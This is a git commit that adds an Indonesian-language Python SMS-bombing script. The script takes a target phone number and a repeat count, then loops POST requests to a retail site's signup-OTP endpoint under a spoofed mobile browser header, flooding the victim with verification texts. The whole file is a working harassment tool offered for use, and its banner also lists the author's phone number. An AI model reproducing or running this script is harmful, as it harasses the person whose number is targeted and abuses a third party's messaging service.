96de1f631d01a045b862f25a5a02e33e01b64d58
Mrfoxs26 <70868044+Mrfoxs26@users.noreply.github.com>
2020-09-22 09:40:20 +0700

    Add files via upload

---
+++ mrfoxs.py
@@ -0,0 +1,42 @@
+import json
+import requests
+import os
+import sys
+
+def main():
+        os.system('clear')
+        os.system('figlet mr.foxs spam sms')
+        barner = '''
+___________________________________________________
+|   [•]Pembuat=Mrfoxs                             |
+|   [•]Alamat github=https://github.com/Mrfoxs26  |
+|   [√]Done                                       |
+|   [•]No.pembuat:089513540577                    |
+|_________________________________________________|
+
+'''
+        print(barner)
+        no = input('Target : ')
+        jumlah = input('Jumlah Spam : ')
+
+        head = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+        "Referer": "https://www.mapclub.com/en/user/signup",
+        "Host": "cmsapi.mapclub.com",
+        }
+
+
+        dat = {
+        'phone' : no
+        }
+
+
+
+        for x in range(int(jumlah)):
+                leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
+                if 'error' in leosureo:
+                        print(' gagal mengirim spam '+ no)
+                else:
+                        print(' berhasil mengirim spam  '+ no)
+
+main()
